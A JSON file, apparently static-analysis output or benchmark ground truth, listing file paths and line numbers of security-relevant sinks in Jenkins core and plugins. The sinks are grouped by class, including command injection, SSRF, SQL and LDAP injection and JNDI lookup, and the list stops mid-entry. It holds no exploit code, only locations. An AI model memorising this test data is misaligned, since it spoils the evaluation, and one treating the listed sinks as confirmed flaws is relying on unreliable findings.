{
    "sinks": {
        "OS Command Injection": [
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 1025,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Proc.java",
                "line": 252,
                "column": 25
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/os/SU.java",
                "line": 93,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/restarter/WinswSlaveRestarter.java",
                "line": 35,
                "column": 21
            },
            {
                "path": "src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java",
                "line": 194,
                "column": 27
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 517,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 1395,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/slaves/Channels.java",
                "line": 236,
                "column": 18
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tasks/CommandInterpreter.java",
                "line": 144,
                "column": 33
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserRemoteConfig.java",
                "line": 85,
                "column": 28
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserRemoteConfig.java",
                "line": 91,
                "column": 13
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 1463,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 1464,
                "column": 17
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/os/WindowsUtil.java",
                "line": 100,
                "column": 54
            }
        ],
        "Server Side Request Forgery (SSRF)": [
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 2069,
                "column": 25
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java",
                "line": 593,
                "column": 67
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java",
                "line": 694,
                "column": 67
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tools/ZipExtractionInstaller.java",
                "line": 130,
                "column": 67
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormValidation.java",
                "line": 488,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/telemetry/Telemetry.java",
                "line": 238,
                "column": 67
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java",
                "line": 245,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/TcpSlaveAgentListener.java",
                "line": 215,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 1053,
                "column": 118
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/DownloadService.java",
                "line": 122,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/DownloadService.java",
                "line": 147,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Slave.java",
                "line": 399,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Slave.java",
                "line": 471,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1321,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1455,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormFieldValidator.java",
                "line": 269,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormValidation.java",
                "line": 516,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/SetupWizard.java",
                "line": 567,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2196,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormFieldValidator.java",
                "line": 338,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateSite.java",
                "line": 218,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ResourceDomainConfiguration.java",
                "line": 150,
                "column": 51
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/CLI.java",
                "line": 391,
                "column": 73
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2520,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tools/DownloadFromUrlInstaller.java",
                "line": 77,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 168,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/DownloadService.java",
                "line": 391,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2567,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1210,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1233,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2425,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tools/ZipExtractionInstaller.java",
                "line": 86,
                "column": 48
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/SetupWizard.java",
                "line": 564,
                "column": 76
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1235,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 131,
                "column": 50
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/CLI.java",
                "line": 309,
                "column": 35
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/FullDuplexHttpStream.java",
                "line": 58,
                "column": 30
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java",
                "line": 463,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1899,
                "column": 81
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/SSHCLI.java",
                "line": 65,
                "column": 27
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 102,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 106,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ResourceDomainConfiguration.java",
                "line": 115,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 119,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 116,
                "column": 30
            }
        ],
        "Remote Code Execution": [
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java",
                "line": 131,
                "column": 61
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java",
                "line": 733,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 290,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/XmlFile.java",
                "line": 165,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ComputerSet.java",
                "line": 267,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/View.java",
                "line": 1408,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/agents/CloudSet.java",
                "line": 207,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/InstallUtil.java",
                "line": 292,
                "column": 60
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/CoverageViewModel.java",
                "line": 145,
                "column": 65
            }
        ],
        "SQL Injection": [
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java",
                "line": 34,
                "column": 32
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java",
                "line": 35,
                "column": 32
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java",
                "line": 74,
                "column": 35
            }
        ],
        "Remote JNDI Lookup": [
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java",
                "line": 58,
                "column": 30
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java",
                "line": 63,
                "column": 26
            }
        ],
        "LDAP Injection": [
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 193,
                "column": 73
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 193,
                "column": 103
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 229,
                "column": 73
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 229,
                "column": 103
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 280,
                "column": 73
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AuthAction.java",
                "line": 280,
                "column": 82
            }
        ],
        "XPath Injection": [
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 166,
                "column": 26
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 184,
                "column": 26
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 221,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 221,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 236,
                "column": 39
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java",
                "line": 125,
                "column": 43
            }
        ],
        "load arbitrary library": [
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 374,
                "column": 68
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 635,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ExtensionFinder.java",
                "line": 772,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginFirstClassLoader2.java",
                "line": 69,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 279,
                "column": 76
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1208,
                "column": 72
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 2402,
                "column": 68
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/WebAppMain.java",
                "line": 143,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/declarative/CLIRegisterer.java",
                "line": 296,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/init/TaskMethodFinder.java",
                "line": 88,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/lifecycle/Lifecycle.java",
                "line": 70,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/AbstractBuild.java",
                "line": 1102,
                "column": 89
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/AbstractBuild.java",
                "line": 1114,
                "column": 89
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/JDK.java",
                "line": 198,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Slave.java",
                "line": 238,
                "column": 106
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 290,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java",
                "line": 486,
                "column": 85
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java",
                "line": 509,
                "column": 82
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/Permission.java",
                "line": 244,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/DescriptorList.java",
                "line": 213,
                "column": 27
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/MaskingClassLoader.java",
                "line": 80,
                "column": 32
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/Service.java",
                "line": 63,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/Service.java",
                "line": 96,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/XStream2.java",
                "line": 508,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/GlobalProjectNamingStrategyConfiguration.java",
                "line": 51,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/Jenkins.java",
                "line": 2855,
                "column": 73
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/JenkinsLocationConfiguration.java",
                "line": 180,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/experimentalflags/UserExperimentalFlag.java",
                "line": 133,
                "column": 87
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaplerDispatchValidator.java",
                "line": 263,
                "column": 57
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 288,
                "column": 37
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 330,
                "column": 40
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/dbf/ParameterizedTriggerDBF.java",
                "line": 73,
                "column": 41
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CompatibleObjectInputStream.java",
                "line": 37,
                "column": 42
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/UserNameAction.java",
                "line": 27,
                "column": 27
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java",
                "line": 98,
                "column": 39
            }
        ],
        "Regular Expression Injection": [
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/CLI.java",
                "line": 364,
                "column": 178
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/SSHCLI.java",
                "line": 77,
                "column": 66
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/SSHCLI.java",
                "line": 78,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 226,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 243,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 313,
                "column": 69
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 436,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 400,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 2173,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 2330,
                "column": 29
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 2329,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 2401,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Functions.java",
                "line": 2404,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Launcher.java",
                "line": 800,
                "column": 61
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 135,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 717,
                "column": 62
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 726,
                "column": 72
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 876,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 877,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1970,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1973,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 2305,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginWrapper.java",
                "line": 444,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginWrapper.java",
                "line": 1013,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java",
                "line": 226,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java",
                "line": 228,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/CLICommand.java",
                "line": 178,
                "column": 32
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/init/InitStrategy.java",
                "line": 79,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/logging/LogRecorder.java",
                "line": 171,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/logging/LogRecorder.java",
                "line": 226,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/AbstractProject.java",
                "line": 688,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Api.java",
                "line": 153,
                "column": 42
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ChoiceParameterDefinition.java",
                "line": 41,
                "column": 95
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ChoiceParameterDefinition.java",
                "line": 114,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Computer.java",
                "line": 388,
                "column": 63
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Computer.java",
                "line": 389,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Computer.java",
                "line": 1681,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FreeStyleProject.java",
                "line": 109,
                "column": 96
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Items.java",
                "line": 253,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Items.java",
                "line": 254,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Items.java",
                "line": 320,
                "column": 119
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Items.java",
                "line": 321,
                "column": 122
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ListView.java",
                "line": 143,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ListView.java",
                "line": 484,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ListView.java",
                "line": 516,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ParametersAction.java",
                "line": 105,
                "column": 66
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Queue.java",
                "line": 2861,
                "column": 47
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Run.java",
                "line": 1316,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/RunParameterValue.java",
                "line": 72,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/TopLevelItemDescriptor.java",
                "line": 248,
                "column": 90
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/TopLevelItemDescriptor.java",
                "line": 248,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateSite.java",
                "line": 851,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateSite.java",
                "line": 854,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateSite.java",
                "line": 1398,
                "column": 66
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/scheduler/CronTab.java",
                "line": 569,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/scheduler/CronTab.java",
                "line": 572,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/scheduler/CronTabList.java",
                "line": 111,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/search/ParsedQuickSilver.java",
                "line": 87,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/search/Search.java",
                "line": 343,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java",
                "line": 499,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/HudsonPrivateSecurityRealm.java",
                "line": 501,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/csrf/CrumbFilter.java",
                "line": 80,
                "column": 71
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java",
                "line": 114,
                "column": 48
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/slaves/Channels.java",
                "line": 232,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/slaves/ComputerLauncher.java",
                "line": 189,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tasks/BuildTrigger.java",
                "line": 350,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tasks/Maven.java",
                "line": 311,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tasks/Maven.java",
                "line": 411,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/tools/ToolInstaller.java",
                "line": 128,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/ArgumentListBuilder.java",
                "line": 258,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormFieldValidator.java",
                "line": 305,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FormValidation.java",
                "line": 566,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/IOUtils.java",
                "line": 122,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/MultipartFormDataParser.java",
                "line": 153,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/QueryParameterMap.java",
                "line": 60,
                "column": 47
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/QueryParameterMap.java",
                "line": 61,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/XStream2.java",
                "line": 304,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/jelly/MorphTagLibrary.java",
                "line": 67,
                "column": 69
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/widgets/RenderOnDemandClosure.java",
                "line": 75,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/I18n.java",
                "line": 90,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/Jenkins.java",
                "line": 5189,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/Jenkins.java",
                "line": 5758,
                "column": 68
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/MasterBuildConfiguration.java",
                "line": 55,
                "column": 30
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/ProjectNamingStrategy.java",
                "line": 176,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/ProjectNamingStrategy.java",
                "line": 221,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/monitor/OperatingSystemEndOfLifeAdminMonitor.java",
                "line": 187,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/InetAddressValidator.java",
                "line": 137,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/InetAddressValidator.java",
                "line": 142,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/InetAddressValidator.java",
                "line": 152,
                "column": 32
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/InetAddressValidator.java",
                "line": 158,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/InetAddressValidator.java",
                "line": 171,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/org/apache/commons/validator/routines/RegexValidator.java",
                "line": 137,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/plugins/DetachedPluginsUtil.java",
                "line": 52,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/plugins/DetachedPluginsUtil.java",
                "line": 140,
                "column": 100
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 120,
                "column": 119
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 202,
                "column": 29
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 240,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 245,
                "column": 104
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 249,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/CustomClassFilter.java",
                "line": 99,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/CustomClassFilter.java",
                "line": 162,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ResourceDomainRootAction.java",
                "line": 156,
                "column": 103
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ResourceDomainRootAction.java",
                "line": 231,
                "column": 85
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ResourceDomainRootAction.java",
                "line": 298,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaplerDispatchValidator.java",
                "line": 292,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaplerDispatchValidator.java",
                "line": 296,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaticRoutingDecisionProvider.java",
                "line": 254,
                "column": 47
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/tasks/filters/impl/RetainVariablesLocalRule.java",
                "line": 87,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/PluginLabelUtil.java",
                "line": 45,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/UrlHelper.java",
                "line": 91,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/VirtualFile.java",
                "line": 342,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/icon/Icon.java",
                "line": 277,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/icon/IconSet.java",
                "line": 564,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 59,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 62,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 65,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 68,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 96,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 95,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 94,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 93,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/Symbol.java",
                "line": 92,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/org/jenkins/ui/symbol/SymbolRequest.java",
                "line": 212,
                "column": 36
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 161,
                "column": 44
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 206,
                "column": 38
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 496,
                "column": 48
            },
            {
